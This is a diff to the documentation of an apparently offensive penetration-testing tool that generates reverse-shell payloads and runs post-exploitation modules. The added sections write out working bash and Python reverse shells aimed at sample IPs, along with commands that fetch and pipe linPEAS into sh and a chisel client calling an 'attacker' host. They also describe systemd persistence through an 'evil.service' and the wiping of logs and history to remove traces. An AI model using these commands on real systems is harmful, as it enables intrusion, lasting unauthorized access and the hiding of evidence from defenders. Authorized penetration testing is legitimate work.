@@ -41,6 +41,63 @@ This comprehensive documentation covers all features, tools, and capabilities of
 
 ## 🚀 Command Line Interface
 
+### Basic Reverse Shell Workflow
+```mermaid
+graph TD
+    subgraph "Penetration Tester"
+        A[👤 Attacker] -->|"Uses"| B[🧙‍♂️ Necromancy]
+    end
+    
+    subgraph "Target System"
+        C[🖥️ Target] -->|"Connects to"| D[🌐 Listener]
+        E[💻 Shell] -->|"Provides"| F[🔓 Access]
+    end
+    
+    B -->|"Configures"| G[⚙️ Listener Setup]
+    G -->|"Generates"| H[📄 Payloads]
+    H -->|"Executed on"| C
+    C -->|"Establishes"| I[🔗 Reverse Connection]
+    I -->|"Creates"| J[🎯 Interactive Session]
+    J -->|"Enables"| K[🛠️ Post-Exploitation]
+    K -->|"Includes"| L[📁 File Operations]
+    K -->|"Includes"| M[🔍 Module Execution]
+    
+    style A fill:#4CAF50,stroke:#2E7D32,color:#fff
+    style B fill:#9C27B0,stroke:#6A1B9A,color:#fff
+    style C fill:#FF5722,stroke:#D84315,color:#fff
+    style J fill:#2196F3,stroke:#1565C0,color:#fff
+    style K fill:#FFC107,stroke:#F57C00,color:#000
+```
+
+### Session Management Flow
+```mermaid
+graph LR
+    subgraph "Session Management"
+        A[📊 Session Browser] --> B[🖱️ Select Session]
+        B --> C[🔗 Interactive Shell]
+        C --> D[🛠️ Post-Exploitation Tools]
+    end
+    
+    subgraph "Available Tools"
+        D --> E[📁 File Manager]
+        D --> F[🔍 Module Browser]
+        D --> G[⚙️ System Tools]
+        D --> H[📡 Network Tools]
+    end
+    
+    subgraph "Session Operations"
+        I[📝 Session Logs] --> A
+        J[🔒 Session Security] --> A
+        K[⏰ Session Timing] --> A
+    end
+    
+    style A fill:#2196F3,stroke:#1565C0,color:#fff
+    style C fill:#4CAF50,stroke:#2E7D32,color:#fff
+    style D fill:#FF9800,stroke:#F57C00,color:#000
+    style E fill:#9C27B0,stroke:#6A1B9A,color:#fff
+    style F fill:#E91E63,stroke:#C2185B,color:#fff
+```
+
 ### Basic Usage
 
 ```bash
@@ -187,6 +244,28 @@ This comprehensive documentation covers all features, tools, and capabilities of
 └─────────────────────────────────────────────────────────────┘
 ```
 
+### Payload Updates Feature
+
+The **Payload Updates** feature automatically updates generated payloads with real network information:
+
+1. **IP Detection**: Automatically detects local and public IP addresses
+2. **Port Configuration**: Uses configured listening ports instead of defaults
+3. **Template Replacement**: Replaces `YOUR_IP` with actual IP addresses
+4. **Multi-IP Support**: Prefers public IP when available, falls back to local IP
+5. **Real-time Updates**: Payloads refresh when network information changes
+
+Example of payload update process:
+```bash
+# Before update:
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+
+# After update (with public IP):
+bash -i >& /dev/tcp/203.0.113.45/4444 0>&1
+
+# After update (with local IP only):
+bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
+```
+
 ### Payload Generator
 
 ```
@@ -205,25 +284,63 @@ This comprehensive documentation covers all features, tools, and capabilities of
 └─────────────────────────────────────────────────────────────┘
 ```
 
+### Payload Examples with IP Updates
+
+#### Before IP Detection (Template):
+```bash
+# Template payload (shows YOUR_IP placeholder)
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+```
+
+#### After IP Detection (Actual IPs):
+```bash
+# With public IP detected
+bash -i >& /dev/tcp/203.0.113.45/4444 0>&1
+
+# With local IP only
+bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
+
+# With custom port
+bash -i >& /dev/tcp/203.0.113.45/8080 0>&1
+```
+
+#### Payload Update Process:
+1. **Network Detection**: System detects local and public IP addresses
+2. **IP Selection**: Prefers public IP when available, falls back to local IP
+3. **Port Configuration**: Uses configured listening ports (default 4444 or custom)
+4. **Template Replacement**: Replaces `YOUR_IP` with actual IP address
+5. **Real-time Updates**: Payloads refresh when network info changes
+
+#### Supported Payload Types:
+- **🐚 Bash**: Traditional bash reverse shell
+- **🐍 Python**: Python with PTY support for full TTY
+- **🕸️ Netcat**: FIFO-based netcat reverse shell
+- **💎 PowerShell**: Windows PowerShell reverse shell
+- **🐘 PHP**: PHP reverse shell for web servers
+- **💎 Ruby**: Ruby reverse shell
+- **🐪 Perl**: Perl reverse shell
+
 ## 🛠️ Post-Exploitation Modules
 
 ### Available Modules
 
-| Module | Description | Platform |
-|--------|-------------|----------|
-| **PEASS** | Privilege escalation awesome scripts suite | Linux/Windows |
-| **Linux Exploit Suggester** | Automated exploit recommendations | Linux |
-| **LSE** | Linux smart enumeration tool | Linux |
-| **Potato Exploits** | Windows privilege escalation methods | Windows |
-| **Chisel** | Fast TCP/UDP tunnel over HTTP | Multi |
-| **Ligolo** | Reverse proxy for penetration testing | Multi |
-| **Ngrok** | Secure tunnel to localhost | Multi |
-| **Meterpreter** | Upgrade to Metasploit sessions | Multi |
-| **Cleanup** | Remove tracks and artifacts | Multi |
-| **Traitor** | Automated Linux privilege escalation | Linux |
-| **UAC Bypass** | Windows UAC bypass techniques | Windows |
-| **Panix** | Linux persistence via systemd | Linux |
-| **Memory Dump** | Process memory analysis | Linux |
+| Module | Description | Platform | Category |
+|--------|-------------|----------|----------|
+| **PEASS** | Privilege escalation awesome scripts suite | Linux/Windows | 🎯 Enumeration |
+| **Linux Exploit Suggester** | Automated exploit recommendations | Linux | ⚡ Exploitation |
+| **LSE** | Linux smart enumeration tool | Linux | 🎯 Enumeration |
+| **Potato Exploits** | Windows privilege escalation methods | Windows | 🔑 Privilege Escalation |
+| **Chisel** | Fast TCP/UDP tunnel over HTTP | Multi | 🚇 Tunneling |
+| **Ligolo** | Reverse proxy for penetration testing | Multi | 🚇 Tunneling |
+| **Ngrok** | Secure tunnel to localhost | Multi | 🚇 Tunneling |
+| **Meterpreter** | Upgrade to Metasploit sessions | Multi | 🚀 Session Upgrade |
+| **Cleanup** | Remove tracks and artifacts | Multi | 🧹 Cleanup |
+| **Traitor** | Automated Linux privilege escalation | Linux | 🔑 Privilege Escalation |
+| **UAC Bypass** | Windows UAC bypass techniques | Windows | 🔑 Privilege Escalation |
+| **Panix** | Linux persistence via systemd | Linux | 🕰️ Persistence |
+| **Memory Dump** | Process memory analysis | Linux | 🧠 Forensics |
 
 ### Module Usage
 
@@ -236,6 +353,99 @@ This comprehensive documentation covers all features, tools, and capabilities of
 
 # Get module help
 > m help peass
+```
+
+### Module Categories and Examples
+
+#### 🎯 Enumeration Modules
+- **PEASS**: Comprehensive privilege escalation enumeration
+- **LSE**: Linux Smart Enumeration for detailed system analysis
+- **Linux Exploit Suggester**: Automated exploit recommendations based on system version
+
+#### 🔑 Privilege Escalation Modules
+- **Potato Exploits**: Windows privilege escalation (RottenPotato, JuicyPotato, SweetPotato)
+- **Traitor**: Automated Linux privilege escalation
+- **UAC Bypass**: Windows User Account Control bypass techniques
+
+#### 🚇 Tunneling and Pivoting Modules
+- **Chisel**: Fast TCP/UDP tunnel over HTTP
+- **Ligolo**: Advanced reverse proxy for penetration testing
+- **Ngrok**: Secure tunnel to localhost for external access
+
+#### 🚀 Session Upgrade Modules
+- **Meterpreter**: Upgrade to Metasploit sessions for advanced post-exploitation
+
+#### 🧹 Cleanup and Persistence Modules
+- **Cleanup**: Remove logs, history, and artifacts from target system
+- **Panix**: Linux persistence via systemd services
+
+#### 🧠 Forensics Modules
+- **Memory Dump**: Process memory analysis and extraction
+
+### Detailed Module Examples
+
+#### PEASS (Privilege Escalation Awesome Scripts Suite)
+```bash
+# Run PEASS on Linux target
+> m peass
+# This executes: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Run PEASS on Windows target  
+> m peass
+# This executes: iwr -useb https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe; .\winpeas.exe
+```
+
+#### Linux Exploit Suggester
+```bash
+# Run exploit suggester
+> m linux_exploit_suggester
+# This analyzes kernel version and suggests applicable exploits
+# Output: [+] Possible Exploits: dirtycow, privilege_escalation_1, etc.
+```
+
+#### Potato Exploits (Windows)
+```bash
+# Run potato exploits
+> m potato
+# This tests various potato exploits: RottenPotato, JuicyPotato, SweetPotato
+# Output: [+] Testing JuicyPotato... [+] Success! SYSTEM privileges obtained
+```
+
+#### Tunneling Tools
+```bash
+# Setup Chisel tunnel
+> m chisel
+# This sets up: chisel server -p 8080 --reverse
+# Then on target: chisel client http://attacker:8080 R:socks
+
+# Setup Ngrok tunnel
+> m ngrok
+# This configures ngrok for secure external access
+```
+
+#### Memory Analysis
+```bash
+# Dump process memory
+> m memory_dump
+# This creates memory dump of critical processes for analysis
+# Output: [+] Memory dump saved to /tmp/memory_dump_[pid].dmp
+```
+
+#### Persistence (Panix)
+```bash
+# Setup systemd persistence
+> m panix
+# This creates systemd service for persistence
+# Service: /etc/systemd/system/evil.service
+# Command: systemctl enable evil.service
+```
+
+#### Cleanup
+```bash
+# Remove traces
+> m cleanup
+# This removes: logs, history, temp files, artifacts
+# Actions: clear logs, remove temp files, clear history
 ```
 
 ## ⚙️ Advanced Features
